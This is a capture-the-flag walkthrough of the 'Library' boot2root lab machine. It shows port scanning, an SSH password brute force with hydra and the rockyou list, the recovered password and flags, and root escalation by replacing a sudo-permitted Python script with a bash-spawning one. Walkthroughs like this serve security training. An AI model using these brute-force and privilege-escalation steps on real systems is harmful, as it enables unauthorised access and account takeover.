# Library

boot2root machine for FIT and bsides guatemala CTF

# #1 - user.txt

Nmap reveals 2 open ports: SSH and HTTP on their standard ports:

~~~
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
|_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to  Blog - Library Machine
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

dirsearch doesn't reveal any interesting hidden directory:

~~~
$ /data/src/dirsearch/dirsearch.py -u http://10.10.186.119 -E -w /data/src/wordlists/directory-list-2.3-medium.txt 

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, js, html, do, action | HTTP method: get | Threads: 10 | Wordlist size: 220529

Error Log: /data/src/dirsearch/logs/errors-20-06-22_17-40-21.log

Target: http://10.10.186.119

[17:40:21] Starting: 
[17:40:22] 200 -    5KB - /
[17:40:22] 301 -  315B  - /images  ->  http://10.10.186.119/images/
[17:40:24] 403 -  292B  - /.hta
[17:48:41] 403 -  301B  - /server-status

Task Completed
~~~

However, there is a robot file which gives a hint (`rockyou`). Should we brute force an account?

~~~
$ curl -s http://10.10.186.119/robots.txt
User-agent: rockyou 
Disallow: /
~~~

Browsing the main webpage (the only one) reveals a static page where no link is working, but there are accounts information left on the page:

* `meliodas` (author)
* `root` (posted a comment)
* `www-data` (posted a comment)
* `Anonymous` (posted a comment)

Let's try to brute force melioda's account: 

~~~
$ hydra -l meliodas -P /data/src/wordlists/rockyou.txt ssh://10.10.186.119
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-22 17:58:55
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.10.186.119:22/
[STATUS] 183.00 tries/min, 183 tries in 00:01h, 14344222 to do in 1306:24h, 16 active
[22][ssh] host: 10.10.186.119   login: meliodas   password: iloveyou1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-22 18:00:34
~~~

After a very short while, we get meliodas password: `iloveyou1`. Let's try to connect to the SSH service:

~~~
$ ssh meliodas@10.10.186.119
meliodas@ubuntu:~$ cat user.txt 
6d488cbb3f111d135722c33cb635f4ec
~~~

User flag: `6d488cbb3f111d135722c33cb635f4ec`

# #2 - root.txt

Let's check our privileges:

~~~
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
~~~

We can run the `bak.py` python script as sudo without password. Let's see what this script is all about:

~~~
meliodas@ubuntu:~$ cat bak.py 
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
~~~

The `bak.py` file is owned by root and we can't modify it:

~~~
-rw-r--r-- 1 root     root      353 Aug 23  2019 bak.py
~~~

However, it is in our home directory where we have write access. Hence, we can remove the file, and replace it's content:

~~~
meliodas@ubuntu:~$ rm -f bak.py
meliodas@ubuntu:~$ cat > bak.py << EOF
#!/usr/bin/env python
import pty
pty.spawn("/bin/bash")
EOF
~~~

Let's elevate to root and get the root flag:

~~~
meliodas@ubuntu:~$ sudo /usr/bin/python3 /home/meliodas/bak.py
root@ubuntu:~# cat /root/root.txt 
e8c8c6c256c35515d1d344ee0488c617
~~~

Root flag: `e8c8c6c256c35515d1d344ee0488c617`